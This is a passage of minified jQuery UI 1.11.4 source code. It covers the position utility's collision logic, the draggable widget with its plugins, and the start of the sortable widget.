");1===pos.length&&(pos=rhorizontal.test(pos[0])?pos.concat(["center"]):rvertical.test(pos[0])?["center"].concat(pos):["center","center"]),pos[0]=rhorizontal.test(pos[0])?pos[0]:"center",pos[1]=rvertical.test(pos[1])?pos[1]:"center",horizontalOffset=roffset.exec(pos[0]),verticalOffset=roffset.exec(pos[1]),offsets[this]=[horizontalOffset?horizontalOffset[0]:0,verticalOffset?verticalOffset[0]:0],options[this]=[rposition.exec(pos[0])[0],rposition.exec(pos[1])[0]]})),1===collision.length&&(collision[1]=collision[0]),"right"===options.at[0]?basePosition.left+=targetWidth:"center"===options.at[0]&&(basePosition.left+=targetWidth/2),"bottom"===options.at[1]?basePosition.top+=targetHeight:"center"===options.at[1]&&(basePosition.top+=targetHeight/2),atOffset=getOffsets(offsets.at,targetWidth,targetHeight),basePosition.left+=atOffset[0],basePosition.top+=atOffset[1],this.each((function(){var collisionPosition,using,elem=$(this),elemWidth=elem.outerWidth(),elemHeight=elem.outerHeight(),marginLeft=parseCss(this,"marginLeft"),marginTop=parseCss(this,"marginTop"),collisionWidth=elemWidth+marginLeft+parseCss(this,"marginRight")+scrollInfo.width,collisionHeight=elemHeight+marginTop+parseCss(this,"marginBottom")+scrollInfo.height,position=$.extend({},basePosition),myOffset=getOffsets(offsets.my,elem.outerWidth(),elem.outerHeight());"right"===options.my[0]?position.left-=elemWidth:"center"===options.my[0]&&(position.left-=elemWidth/2),"bottom"===options.my[1]?position.top-=elemHeight:"center"===options.my[1]&&(position.top-=elemHeight/2),position.left+=myOffset[0],position.top+=myOffset[1],supportsOffsetFractions||(position.left=round(position.left),position.top=round(position.top)),collisionPosition={marginLeft:marginLeft,marginTop:marginTop},$.each(["left","top"],(function(i,dir){$.ui.position[collision[i]]&&$.ui.position[collision[i]][dir](position,{targetWidth:targetWidth,targetHeight:targetHeight,elemWidth:elemWidth,elemHeight:elemHeight,collisionPosition:collisionPosition,collisionWidth:collisionWidth,collisionHeight:collisionHeight,offset:[atOffset[0]+myOffset[0],atOffset[1]+myOffset[1]],my:options.my,at:options.at,within:within,elem:elem})})),options.using&&(using=function(props){var left=targetOffset.left-position.left,right=left+targetWidth-elemWidth,top=targetOffset.top-position.top,bottom=top+targetHeight-elemHeight,feedback={target:{element:target,left:targetOffset.left,top:targetOffset.top,width:targetWidth,height:targetHeight},element:{element:elem,left:position.left,top:position.top,width:elemWidth,height:elemHeight},horizontal:right<0?"left":left>0?"right":"center",vertical:bottom<0?"top":top>0?"bottom":"middle"};targetWidth<elemWidth&&abs(left+right)<targetWidth&&(feedback.horizontal="center"),targetHeight<elemHeight&&abs(top+bottom)<targetHeight&&(feedback.vertical="middle"),max(abs(left),abs(right))>max(abs(top),abs(bottom))?feedback.important="horizontal":feedback.important="vertical",options.using.call(this,props,feedback)}),elem.offset($.extend(position,{using:using}))}))},$.ui.position={fit:{left:function(position,data){var newOverRight,within=data.within,withinOffset=within.isWindow?within.scrollLeft:within.offset.left,outerWidth=within.width,collisionPosLeft=position.left-data.collisionPosition.marginLeft,overLeft=withinOffset-collisionPosLeft,overRight=collisionPosLeft+data.collisionWidth-outerWidth-withinOffset;data.collisionWidth>outerWidth?overLeft>0&&overRight<=0?(newOverRight=position.left+overLeft+data.collisionWidth-outerWidth-withinOffset,position.left+=overLeft-newOverRight):position.left=overRight>0&&overLeft<=0?withinOffset:overLeft>overRight?withinOffset+outerWidth-data.collisionWidth:withinOffset:overLeft>0?position.left+=overLeft:overRight>0?position.left-=overRight:position.left=max(position.left-collisionPosLeft,position.left)},top:function(position,data){var newOverBottom,within=data.within,withinOffset=within.isWindow?within.scrollTop:within.offset.top,outerHeight=data.within.height,collisionPosTop=position.top-data.collisionPosition.marginTop,overTop=withinOffset-collisionPosTop,overBottom=collisionPosTop+data.collisionHeight-outerHeight-withinOffset;data.collisionHeight>outerHeight?overTop>0&&overBottom<=0?(newOverBottom=position.top+overTop+data.collisionHeight-outerHeight-withinOffset,position.top+=overTop-newOverBottom):position.top=overBottom>0&&overTop<=0?withinOffset:overTop>overBottom?withinOffset+outerHeight-data.collisionHeight:withinOffset:overTop>0?position.top+=overTop:overBottom>0?position.top-=overBottom:position.top=max(position.top-collisionPosTop,position.top)}},flip:{left:function(position,data){var newOverRight,newOverLeft,within=data.within,withinOffset=within.offset.left+within.scrollLeft,outerWidth=within.width,offsetLeft=within.isWindow?within.scrollLeft:within.offset.left,collisionPosLeft=position.left-data.collisionPosition.marginLeft,overLeft=collisionPosLeft-offsetLeft,overRight=collisionPosLeft+data.collisionWidth-outerWidth-offsetLeft,myOffset="left"===data.my[0]?-data.elemWidth:"right"===data.my[0]?data.elemWidth:0,atOffset="left"===data.at[0]?data.targetWidth:"right"===data.at[0]?-data.targetWidth:0,offset=-2*data.offset[0];overLeft<0?((newOverRight=position.left+myOffset+atOffset+offset+data.collisionWidth-outerWidth-withinOffset)<0||newOverRight<abs(overLeft))&&(position.left+=myOffset+atOffset+offset):overRight>0&&((newOverLeft=position.left-data.collisionPosition.marginLeft+myOffset+atOffset+offset-offsetLeft)>0||abs(newOverLeft)<overRight)&&(position.left+=myOffset+atOffset+offset)},top:function(position,data){var newOverTop,newOverBottom,within=data.within,withinOffset=within.offset.top+within.scrollTop,outerHeight=within.height,offsetTop=within.isWindow?within.scrollTop:within.offset.top,collisionPosTop=position.top-data.collisionPosition.marginTop,overTop=collisionPosTop-offsetTop,overBottom=collisionPosTop+data.collisionHeight-outerHeight-offsetTop,myOffset="top"===data.my[1]?-data.elemHeight:"bottom"===data.my[1]?data.elemHeight:0,atOffset="top"===data.at[1]?data.targetHeight:"bottom"===data.at[1]?-data.targetHeight:0,offset=-2*data.offset[1];overTop<0?((newOverBottom=position.top+myOffset+atOffset+offset+data.collisionHeight-outerHeight-withinOffset)<0||newOverBottom<abs(overTop))&&(position.top+=myOffset+atOffset+offset):overBottom>0&&((newOverTop=position.top-data.collisionPosition.marginTop+myOffset+atOffset+offset-offsetTop)>0||abs(newOverTop)<overBottom)&&(position.top+=myOffset+atOffset+offset)}},flipfit:{left:function(){$.ui.position.flip.left.apply(this,arguments),$.ui.position.fit.left.apply(this,arguments)},top:function(){$.ui.position.flip.top.apply(this,arguments),$.ui.position.fit.top.apply(this,arguments)}}},function(){var testElement,testElementParent,testElementStyle,offsetLeft,i,body=document.getElementsByTagName("body")[0],div=document.createElement("div");for(i in testElement=document.createElement(body?"div":"body"),testElementStyle={visibility:"hidden",width:0,height:0,border:0,margin:0,background:"none"},body&&$.extend(testElementStyle,{position:"absolute",left:"-1000px",top:"-1000px"}),testElementStyle)testElement.style[i]=testElementStyle[i];testElement.appendChild(div),(testElementParent=body||document.documentElement).insertBefore(testElement,testElementParent.firstChild),div.style.cssText="position: absolute; left: 10.7432222px;",offsetLeft=$(div).offset().left,supportsOffsetFractions=offsetLeft>10&&offsetLeft<11,testElement.innerHTML="",testElementParent.removeChild(testElement)}()}();$.ui.position;$.widget("ui.draggable",$.ui.mouse,{version:"1.11.4",widgetEventPrefix:"drag",options:{addClasses:!0,appendTo:"parent",axis:!1,connectToSortable:!1,containment:!1,cursor:"auto",cursorAt:!1,grid:!1,handle:!1,helper:"original",iframeFix:!1,opacity:!1,refreshPositions:!1,revert:!1,revertDuration:500,scope:"default",scroll:!0,scrollSensitivity:20,scrollSpeed:20,snap:!1,snapMode:"both",snapTolerance:20,stack:!1,zIndex:!1,drag:null,start:null,stop:null},_create:function(){"original"===this.options.helper&&this._setPositionRelative(),this.options.addClasses&&this.element.addClass("ui-draggable"),this.options.disabled&&this.element.addClass("ui-draggable-disabled"),this._setHandleClassName(),this._mouseInit()},_setOption:function(key,value){this._super(key,value),"handle"===key&&(this._removeHandleClassName(),this._setHandleClassName())},_destroy:function(){(this.helper||this.element).is(".ui-draggable-dragging")?this.destroyOnClear=!0:(this.element.removeClass("ui-draggable ui-draggable-dragging ui-draggable-disabled"),this._removeHandleClassName(),this._mouseDestroy())},_mouseCapture:function(event){var o=this.options;return this._blurActiveElement(event),!(this.helper||o.disabled||$(event.target).closest(".ui-resizable-handle").length>0)&&(this.handle=this._getHandle(event),!!this.handle&&(this._blockFrames(!0===o.iframeFix?"iframe":o.iframeFix),!0))},_blockFrames:function(selector){this.iframeBlocks=this.document.find(selector).map((function(){var iframe=$(this);return $("<div>").css("position","absolute").appendTo(iframe.parent()).outerWidth(iframe.outerWidth()).outerHeight(iframe.outerHeight()).offset(iframe.offset())[0]}))},_unblockFrames:function(){this.iframeBlocks&&(this.iframeBlocks.remove(),delete this.iframeBlocks)},_blurActiveElement:function(event){var document=this.document[0];if(this.handleElement.is(event.target))try{document.activeElement&&"body"!==document.activeElement.nodeName.toLowerCase()&&$(document.activeElement).blur()}catch(error){}},_mouseStart:function(event){var o=this.options;return this.helper=this._createHelper(event),this.helper.addClass("ui-draggable-dragging"),this._cacheHelperProportions(),$.ui.ddmanager&&($.ui.ddmanager.current=this),this._cacheMargins(),this.cssPosition=this.helper.css("position"),this.scrollParent=this.helper.scrollParent(!0),this.offsetParent=this.helper.offsetParent(),this.hasFixedAncestor=this.helper.parents().filter((function(){return"fixed"===$(this).css("position")})).length>0,this.positionAbs=this.element.offset(),this._refreshOffsets(event),this.originalPosition=this.position=this._generatePosition(event,!1),this.originalPageX=event.pageX,this.originalPageY=event.pageY,o.cursorAt&&this._adjustOffsetFromHelper(o.cursorAt),this._setContainment(),!1===this._trigger("start",event)?(this._clear(),!1):(this._cacheHelperProportions(),$.ui.ddmanager&&!o.dropBehaviour&&$.ui.ddmanager.prepareOffsets(this,event),this._normalizeRightBottom(),this._mouseDrag(event,!0),$.ui.ddmanager&&$.ui.ddmanager.dragStart(this,event),!0)},_refreshOffsets:function(event){this.offset={top:this.positionAbs.top-this.margins.top,left:this.positionAbs.left-this.margins.left,scroll:!1,parent:this._getParentOffset(),relative:this._getRelativeOffset()},this.offset.click={left:event.pageX-this.offset.left,top:event.pageY-this.offset.top}},_mouseDrag:function(event,noPropagation){if(this.hasFixedAncestor&&(this.offset.parent=this._getParentOffset()),this.position=this._generatePosition(event,!0),this.positionAbs=this._convertPositionTo("absolute"),!noPropagation){var ui=this._uiHash();if(!1===this._trigger("drag",event,ui))return this._mouseUp({}),!1;this.position=ui.position}return this.helper[0].style.left=this.position.left+"px",this.helper[0].style.top=this.position.top+"px",$.ui.ddmanager&&$.ui.ddmanager.drag(this,event),!1},_mouseStop:function(event){var that=this,dropped=!1;return $.ui.ddmanager&&!this.options.dropBehaviour&&(dropped=$.ui.ddmanager.drop(this,event)),this.dropped&&(dropped=this.dropped,this.dropped=!1),"invalid"===this.options.revert&&!dropped||"valid"===this.options.revert&&dropped||!0===this.options.revert||$.isFunction(this.options.revert)&&this.options.revert.call(this.element,dropped)?$(this.helper).animate(this.originalPosition,parseInt(this.options.revertDuration,10),(function(){!1!==that._trigger("stop",event)&&that._clear()})):!1!==this._trigger("stop",event)&&this._clear(),!1},_mouseUp:function(event){return this._unblockFrames(),$.ui.ddmanager&&$.ui.ddmanager.dragStop(this,event),this.handleElement.is(event.target)&&this.element.focus(),$.ui.mouse.prototype._mouseUp.call(this,event)},cancel:function(){return this.helper.is(".ui-draggable-dragging")?this._mouseUp({}):this._clear(),this},_getHandle:function(event){return!this.options.handle||!!$(event.target).closest(this.element.find(this.options.handle)).length},_setHandleClassName:function(){this.handleElement=this.options.handle?this.element.find(this.options.handle):this.element,this.handleElement.addClass("ui-draggable-handle")},_removeHandleClassName:function(){this.handleElement.removeClass("ui-draggable-handle")},_createHelper:function(event){var o=this.options,helperIsFunction=$.isFunction(o.helper),helper=helperIsFunction?$(o.helper.apply(this.element[0],[event])):"clone"===o.helper?this.element.clone().removeAttr("id"):this.element;return helper.parents("body").length||helper.appendTo("parent"===o.appendTo?this.element[0].parentNode:o.appendTo),helperIsFunction&&helper[0]===this.element[0]&&this._setPositionRelative(),helper[0]===this.element[0]||/(fixed|absolute)/.test(helper.css("position"))||helper.css("position","absolute"),helper},_setPositionRelative:function(){/^(?:r|a|f)/.test(this.element.css("position"))||(this.element[0].style.position="relative")},_adjustOffsetFromHelper:function(obj){"string"==typeof obj&&(obj=obj.split(" ")),$.isArray(obj)&&(obj={left:+obj[0],top:+obj[1]||0}),"left"in obj&&(this.offset.click.left=obj.left+this.margins.left),"right"in obj&&(this.offset.click.left=this.helperProportions.width-obj.right+this.margins.left),"top"in obj&&(this.offset.click.top=obj.top+this.margins.top),"bottom"in obj&&(this.offset.click.top=this.helperProportions.height-obj.bottom+this.margins.top)},_isRootNode:function(element){return/(html|body)/i.test(element.tagName)||element===this.document[0]},_getParentOffset:function(){var po=this.offsetParent.offset(),document=this.document[0];return"absolute"===this.cssPosition&&this.scrollParent[0]!==document&&$.contains(this.scrollParent[0],this.offsetParent[0])&&(po.left+=this.scrollParent.scrollLeft(),po.top+=this.scrollParent.scrollTop()),this._isRootNode(this.offsetParent[0])&&(po={top:0,left:0}),{top:po.top+(parseInt(this.offsetParent.css("borderTopWidth"),10)||0),left:po.left+(parseInt(this.offsetParent.css("borderLeftWidth"),10)||0)}},_getRelativeOffset:function(){if("relative"!==this.cssPosition)return{top:0,left:0};var p=this.element.position(),scrollIsRootNode=this._isRootNode(this.scrollParent[0]);return{top:p.top-(parseInt(this.helper.css("top"),10)||0)+(scrollIsRootNode?0:this.scrollParent.scrollTop()),left:p.left-(parseInt(this.helper.css("left"),10)||0)+(scrollIsRootNode?0:this.scrollParent.scrollLeft())}},_cacheMargins:function(){this.margins={left:parseInt(this.element.css("marginLeft"),10)||0,top:parseInt(this.element.css("marginTop"),10)||0,right:parseInt(this.element.css("marginRight"),10)||0,bottom:parseInt(this.element.css("marginBottom"),10)||0}},_cacheHelperProportions:function(){this.helperProportions={width:this.helper.outerWidth(),height:this.helper.outerHeight()}},_setContainment:function(){var isUserScrollable,c,ce,o=this.options,document=this.document[0];this.relativeContainer=null,o.containment?"window"!==o.containment?"document"!==o.containment?o.containment.constructor!==Array?("parent"===o.containment&&(o.containment=this.helper[0].parentNode),(ce=(c=$(o.containment))[0])&&(isUserScrollable=/(scroll|auto)/.test(c.css("overflow")),this.containment=[(parseInt(c.css("borderLeftWidth"),10)||0)+(parseInt(c.css("paddingLeft"),10)||0),(parseInt(c.css("borderTopWidth"),10)||0)+(parseInt(c.css("paddingTop"),10)||0),(isUserScrollable?Math.max(ce.scrollWidth,ce.offsetWidth):ce.offsetWidth)-(parseInt(c.css("borderRightWidth"),10)||0)-(parseInt(c.css("paddingRight"),10)||0)-this.helperProportions.width-this.margins.left-this.margins.right,(isUserScrollable?Math.max(ce.scrollHeight,ce.offsetHeight):ce.offsetHeight)-(parseInt(c.css("borderBottomWidth"),10)||0)-(parseInt(c.css("paddingBottom"),10)||0)-this.helperProportions.height-this.margins.top-this.margins.bottom],this.relativeContainer=c)):this.containment=o.containment:this.containment=[0,0,$(document).width()-this.helperProportions.width-this.margins.left,($(document).height()||document.body.parentNode.scrollHeight)-this.helperProportions.height-this.margins.top]:this.containment=[$(window).scrollLeft()-this.offset.relative.left-this.offset.parent.left,$(window).scrollTop()-this.offset.relative.top-this.offset.parent.top,$(window).scrollLeft()+$(window).width()-this.helperProportions.width-this.margins.left,$(window).scrollTop()+($(window).height()||document.body.parentNode.scrollHeight)-this.helperProportions.height-this.margins.top]:this.containment=null},_convertPositionTo:function(d,pos){pos||(pos=this.position);var mod="absolute"===d?1:-1,scrollIsRootNode=this._isRootNode(this.scrollParent[0]);return{top:pos.top+this.offset.relative.top*mod+this.offset.parent.top*mod-("fixed"===this.cssPosition?-this.offset.scroll.top:scrollIsRootNode?0:this.offset.scroll.top)*mod,left:pos.left+this.offset.relative.left*mod+this.offset.parent.left*mod-("fixed"===this.cssPosition?-this.offset.scroll.left:scrollIsRootNode?0:this.offset.scroll.left)*mod}},_generatePosition:function(event,constrainPosition){var containment,co,top,left,o=this.options,scrollIsRootNode=this._isRootNode(this.scrollParent[0]),pageX=event.pageX,pageY=event.pageY;return scrollIsRootNode&&this.offset.scroll||(this.offset.scroll={top:this.scrollParent.scrollTop(),left:this.scrollParent.scrollLeft()}),constrainPosition&&(this.containment&&(this.relativeContainer?(co=this.relativeContainer.offset(),containment=[this.containment[0]+co.left,this.containment[1]+co.top,this.containment[2]+co.left,this.containment[3]+co.top]):containment=this.containment,event.pageX-this.offset.click.left<containment[0]&&(pageX=containment[0]+this.offset.click.left),event.pageY-this.offset.click.top<containment[1]&&(pageY=containment[1]+this.offset.click.top),event.pageX-this.offset.click.left>containment[2]&&(pageX=containment[2]+this.offset.click.left),event.pageY-this.offset.click.top>containment[3]&&(pageY=containment[3]+this.offset.click.top)),o.grid&&(top=o.grid[1]?this.originalPageY+Math.round((pageY-this.originalPageY)/o.grid[1])*o.grid[1]:this.originalPageY,pageY=containment?top-this.offset.click.top>=containment[1]||top-this.offset.click.top>containment[3]?top:top-this.offset.click.top>=containment[1]?top-o.grid[1]:top+o.grid[1]:top,left=o.grid[0]?this.originalPageX+Math.round((pageX-this.originalPageX)/o.grid[0])*o.grid[0]:this.originalPageX,pageX=containment?left-this.offset.click.left>=containment[0]||left-this.offset.click.left>containment[2]?left:left-this.offset.click.left>=containment[0]?left-o.grid[0]:left+o.grid[0]:left),"y"===o.axis&&(pageX=this.originalPageX),"x"===o.axis&&(pageY=this.originalPageY)),{top:pageY-this.offset.click.top-this.offset.relative.top-this.offset.parent.top+("fixed"===this.cssPosition?-this.offset.scroll.top:scrollIsRootNode?0:this.offset.scroll.top),left:pageX-this.offset.click.left-this.offset.relative.left-this.offset.parent.left+("fixed"===this.cssPosition?-this.offset.scroll.left:scrollIsRootNode?0:this.offset.scroll.left)}},_clear:function(){this.helper.removeClass("ui-draggable-dragging"),this.helper[0]===this.element[0]||this.cancelHelperRemoval||this.helper.remove(),this.helper=null,this.cancelHelperRemoval=!1,this.destroyOnClear&&this.destroy()},_normalizeRightBottom:function(){"y"!==this.options.axis&&"auto"!==this.helper.css("right")&&(this.helper.width(this.helper.width()),this.helper.css("right","auto")),"x"!==this.options.axis&&"auto"!==this.helper.css("bottom")&&(this.helper.height(this.helper.height()),this.helper.css("bottom","auto"))},_trigger:function(type,event,ui){return ui=ui||this._uiHash(),$.ui.plugin.call(this,type,[event,ui,this],!0),/^(drag|start|stop)/.test(type)&&(this.positionAbs=this._convertPositionTo("absolute"),ui.offset=this.positionAbs),$.Widget.prototype._trigger.call(this,type,event,ui)},plugins:{},_uiHash:function(){return{helper:this.helper,position:this.position,originalPosition:this.originalPosition,offset:this.positionAbs}}}),$.ui.plugin.add("draggable","connectToSortable",{start:function(event,ui,draggable){var uiSortable=$.extend({},ui,{item:draggable.element});draggable.sortables=[],$(draggable.options.connectToSortable).each((function(){var sortable=$(this).sortable("instance");sortable&&!sortable.options.disabled&&(draggable.sortables.push(sortable),sortable.refreshPositions(),sortable._trigger("activate",event,uiSortable))}))},stop:function(event,ui,draggable){var uiSortable=$.extend({},ui,{item:draggable.element});draggable.cancelHelperRemoval=!1,$.each(draggable.sortables,(function(){this.isOver?(this.isOver=0,draggable.cancelHelperRemoval=!0,this.cancelHelperRemoval=!1,this._storedCSS={position:this.placeholder.css("position"),top:this.placeholder.css("top"),left:this.placeholder.css("left")},this._mouseStop(event),this.options.helper=this.options._helper):(this.cancelHelperRemoval=!0,this._trigger("deactivate",event,uiSortable))}))},drag:function(event,ui,draggable){$.each(draggable.sortables,(function(){var innermostIntersecting=!1,sortable=this;sortable.positionAbs=draggable.positionAbs,sortable.helperProportions=draggable.helperProportions,sortable.offset.click=draggable.offset.click,sortable._intersectsWith(sortable.containerCache)&&(innermostIntersecting=!0,$.each(draggable.sortables,(function(){return this.positionAbs=draggable.positionAbs,this.helperProportions=draggable.helperProportions,this.offset.click=draggable.offset.click,this!==sortable&&this._intersectsWith(this.containerCache)&&$.contains(sortable.element[0],this.element[0])&&(innermostIntersecting=!1),innermostIntersecting}))),innermostIntersecting?(sortable.isOver||(sortable.isOver=1,draggable._parent=ui.helper.parent(),sortable.currentItem=ui.helper.appendTo(sortable.element).data("ui-sortable-item",!0),sortable.options._helper=sortable.options.helper,sortable.options.helper=function(){return ui.helper[0]},event.target=sortable.currentItem[0],sortable._mouseCapture(event,!0),sortable._mouseStart(event,!0,!0),sortable.offset.click.top=draggable.offset.click.top,sortable.offset.click.left=draggable.offset.click.left,sortable.offset.parent.left-=draggable.offset.parent.left-sortable.offset.parent.left,sortable.offset.parent.top-=draggable.offset.parent.top-sortable.offset.parent.top,draggable._trigger("toSortable",event),draggable.dropped=sortable.element,$.each(draggable.sortables,(function(){this.refreshPositions()})),draggable.currentItem=draggable.element,sortable.fromOutside=draggable),sortable.currentItem&&(sortable._mouseDrag(event),ui.position=sortable.position)):sortable.isOver&&(sortable.isOver=0,sortable.cancelHelperRemoval=!0,sortable.options._revert=sortable.options.revert,sortable.options.revert=!1,sortable._trigger("out",event,sortable._uiHash(sortable)),sortable._mouseStop(event,!0),sortable.options.revert=sortable.options._revert,sortable.options.helper=sortable.options._helper,sortable.placeholder&&sortable.placeholder.remove(),ui.helper.appendTo(draggable._parent),draggable._refreshOffsets(event),ui.position=draggable._generatePosition(event,!0),draggable._trigger("fromSortable",event),draggable.dropped=!1,$.each(draggable.sortables,(function(){this.refreshPositions()})))}))}}),$.ui.plugin.add("draggable","cursor",{start:function(event,ui,instance){var t=$("body"),o=instance.options;t.css("cursor")&&(o._cursor=t.css("cursor")),t.css("cursor",o.cursor)},stop:function(event,ui,instance){var o=instance.options;o._cursor&&$("body").css("cursor",o._cursor)}}),$.ui.plugin.add("draggable","opacity",{start:function(event,ui,instance){var t=$(ui.helper),o=instance.options;t.css("opacity")&&(o._opacity=t.css("opacity")),t.css("opacity",o.opacity)},stop:function(event,ui,instance){var o=instance.options;o._opacity&&$(ui.helper).css("opacity",o._opacity)}}),$.ui.plugin.add("draggable","scroll",{start:function(event,ui,i){i.scrollParentNotHidden||(i.scrollParentNotHidden=i.helper.scrollParent(!1)),i.scrollParentNotHidden[0]!==i.document[0]&&"HTML"!==i.scrollParentNotHidden[0].tagName&&(i.overflowOffset=i.scrollParentNotHidden.offset())},drag:function(event,ui,i){var o=i.options,scrolled=!1,scrollParent=i.scrollParentNotHidden[0],document=i.document[0];scrollParent!==document&&"HTML"!==scrollParent.tagName?(o.axis&&"x"===o.axis||(i.overflowOffset.top+scrollParent.offsetHeight-event.pageY<o.scrollSensitivity?scrollParent.scrollTop=scrolled=scrollParent.scrollTop+o.scrollSpeed:event.pageY-i.overflowOffset.top<o.scrollSensitivity&&(scrollParent.scrollTop=scrolled=scrollParent.scrollTop-o.scrollSpeed)),o.axis&&"y"===o.axis||(i.overflowOffset.left+scrollParent.offsetWidth-event.pageX<o.scrollSensitivity?scrollParent.scrollLeft=scrolled=scrollParent.scrollLeft+o.scrollSpeed:event.pageX-i.overflowOffset.left<o.scrollSensitivity&&(scrollParent.scrollLeft=scrolled=scrollParent.scrollLeft-o.scrollSpeed))):(o.axis&&"x"===o.axis||(event.pageY-$(document).scrollTop()<o.scrollSensitivity?scrolled=$(document).scrollTop($(document).scrollTop()-o.scrollSpeed):$(window).height()-(event.pageY-$(document).scrollTop())<o.scrollSensitivity&&(scrolled=$(document).scrollTop($(document).scrollTop()+o.scrollSpeed))),o.axis&&"y"===o.axis||(event.pageX-$(document).scrollLeft()<o.scrollSensitivity?scrolled=$(document).scrollLeft($(document).scrollLeft()-o.scrollSpeed):$(window).width()-(event.pageX-$(document).scrollLeft())<o.scrollSensitivity&&(scrolled=$(document).scrollLeft($(document).scrollLeft()+o.scrollSpeed)))),!1!==scrolled&&$.ui.ddmanager&&!o.dropBehaviour&&$.ui.ddmanager.prepareOffsets(i,event)}}),$.ui.plugin.add("draggable","snap",{start:function(event,ui,i){var o=i.options;i.snapElements=[],$(o.snap.constructor!==String?o.snap.items||":data(ui-draggable)":o.snap).each((function(){var $t=$(this),$o=$t.offset();this!==i.element[0]&&i.snapElements.push({item:this,width:$t.outerWidth(),height:$t.outerHeight(),top:$o.top,left:$o.left})}))},drag:function(event,ui,inst){var ts,bs,ls,rs,l,r,t,b,i,first,o=inst.options,d=o.snapTolerance,x1=ui.offset.left,x2=x1+inst.helperProportions.width,y1=ui.offset.top,y2=y1+inst.helperProportions.height;for(i=inst.snapElements.length-1;i>=0;i--)r=(l=inst.snapElements[i].left-inst.margins.left)+inst.snapElements[i].width,b=(t=inst.snapElements[i].top-inst.margins.top)+inst.snapElements[i].height,x2<l-d||x1>r+d||y2<t-d||y1>b+d||!$.contains(inst.snapElements[i].item.ownerDocument,inst.snapElements[i].item)?(inst.snapElements[i].snapping&&inst.options.snap.release&&inst.options.snap.release.call(inst.element,event,$.extend(inst._uiHash(),{snapItem:inst.snapElements[i].item})),inst.snapElements[i].snapping=!1):("inner"!==o.snapMode&&(ts=Math.abs(t-y2)<=d,bs=Math.abs(b-y1)<=d,ls=Math.abs(l-x2)<=d,rs=Math.abs(r-x1)<=d,ts&&(ui.position.top=inst._convertPositionTo("relative",{top:t-inst.helperProportions.height,left:0}).top),bs&&(ui.position.top=inst._convertPositionTo("relative",{top:b,left:0}).top),ls&&(ui.position.left=inst._convertPositionTo("relative",{top:0,left:l-inst.helperProportions.width}).left),rs&&(ui.position.left=inst._convertPositionTo("relative",{top:0,left:r}).left)),first=ts||bs||ls||rs,"outer"!==o.snapMode&&(ts=Math.abs(t-y1)<=d,bs=Math.abs(b-y2)<=d,ls=Math.abs(l-x1)<=d,rs=Math.abs(r-x2)<=d,ts&&(ui.position.top=inst._convertPositionTo("relative",{top:t,left:0}).top),bs&&(ui.position.top=inst._convertPositionTo("relative",{top:b-inst.helperProportions.height,left:0}).top),ls&&(ui.position.left=inst._convertPositionTo("relative",{top:0,left:l}).left),rs&&(ui.position.left=inst._convertPositionTo("relative",{top:0,left:r-inst.helperProportions.width}).left)),!inst.snapElements[i].snapping&&(ts||bs||ls||rs||first)&&inst.options.snap.snap&&inst.options.snap.snap.call(inst.element,event,$.extend(inst._uiHash(),{snapItem:inst.snapElements[i].item})),inst.snapElements[i].snapping=ts||bs||ls||rs||first)}}),$.ui.plugin.add("draggable","stack",{start:function(event,ui,instance){var min,o=instance.options,group=$.makeArray($(o.stack)).sort((function(a,b){return(parseInt($(a).css("zIndex"),10)||0)-(parseInt($(b).css("zIndex"),10)||0)}));group.length&&(min=parseInt($(group[0]).css("zIndex"),10)||0,$(group).each((function(i){$(this).css("zIndex",min+i)})),this.css("zIndex",min+group.length))}}),$.ui.plugin.add("draggable","zIndex",{start:function(event,ui,instance){var t=$(ui.helper),o=instance.options;t.css("zIndex")&&(o._zIndex=t.css("zIndex")),t.css("zIndex",o.zIndex)},stop:function(event,ui,instance){var o=instance.options;o._zIndex&&$(ui.helper).css("zIndex",o._zIndex)}});$.ui.draggable,$.widget("ui.sortable",$.ui.mouse,{version:"1.11.4",widgetEventPrefix:"sort",ready:!1,options:{appendTo:"parent",axis:!1,connectWith:!1,containment:!1,cursor:"auto",cursorAt:!1,dropOnEmpty:!0,forcePlaceholderSize:!1,forceHelperSize:!1,grid:!1,handle:!1,helper:"original",items:"> *",opacity:!1,placeholder:!1,revert:!1,scroll:!0,scrollSensitivity:20,scrollSpeed:20,scope:"default",tolerance:"intersect",zIndex:1e3,activate:null,beforeStop:null,change:null,deactivate:null,out:null,over:null,receive:null,remove:null,sort:null,start:null,stop:null,update:null},_isOverAxis:function(x,reference,size){return x>=reference&&x<reference+size},_isFloating:function(item){return/left|right/.test(item.css("float"))||/inline|table-cell/.test(item.css("display"))},_create:function(){this.containerCache={},this.element.addClass("ui-sortable"),this.refresh(),this.offset=this.element.offset(),this._mouseInit(),this._setHandleClassName(),this.ready=!0},_setOption:function(key,value){this._super(key,value),"handle"===key&&this._setHandleClassName()},_setHandleClassName:function(){this.element.find(".ui-sortable-handle").removeClass("ui-sortable-handle"),$.each(this.items,(function(){(this.instance.options.handle?this.item.find(this.instance.options.handle):this.item).addClass("ui-sortable-handle")}))},_destroy:function(){this.element.removeClass("ui-sortable ui-sortable-disabled").find(".ui-sortable-handle").removeClass("ui-sortable-handle"),this._mouseDestroy();for(var i=this.items.length-1;i>=0;i--)this.items[i].item.removeData(this.widgetName+"-item");return this},_mouseCapture:function(event,overrideHandle){var currentItem=null,validHandle=!1,that=this;return!this.reverting&&(!this.options.disabled&&"static"!==this.options.type&&(this._refreshItems(event),$(event.target).parents().each((function(){if($.data(this,that.widgetName+"-item")===that)return currentItem=$(this),!1})),$.data(event.target,that.widgetName+"-item")===that&&(currentItem=$(event.target)),!!currentItem&&(!(this.options.handle&&!overrideHandle&&($(this.options.handle,currentItem).find("*").addBack().each((function(){this===event.target&&(validHandle=!0)})),!validHandle))&&(this.currentItem=currentItem,this._removeCurrentsFromItems(),!0))))},_mouseStart:function(event,overrideHandle,noActivation){var i,body,o=this.options;if(this.currentContainer=this,this.refreshPositions(),this.helper=this._createHelper(event),this._cacheHelperProportions(),this._cacheMargins(),this.scrollParent=this.helper.scrollParent(),this.offset=this.currentItem.offset(),this.offset={top:this.offset.top-this.margins.top,left:this.offset.left-this.margins.left},$.extend(this.offset,{click:{left:event.pageX-this.offset.left,top:event.pageY-this.offset.top},parent:this._getParentOffset(),relative:this._getRelativeOffset()}),this.helper.css("position","absolute"),this.cssPosition=this.helper.css("position"),this.originalPosition=this._generatePosition(event),this.originalPageX=event.pageX,this.originalPageY=event.pageY,o.cursorAt&&this._adjustOffsetFromHelper(o.cursorAt),this.domPosition={prev:this.currentItem.prev()[0],parent:this.currentItem.parent()[0]},this.helper[0]!==this.currentItem[0]&&this.currentItem.hide(),this._createPlaceholder(),o.containment&&this._setContainment(),o.cursor&&"auto"!==o.cursor&&(body=this.document.find("body"),this.storedCursor=body.css("cursor"),body.c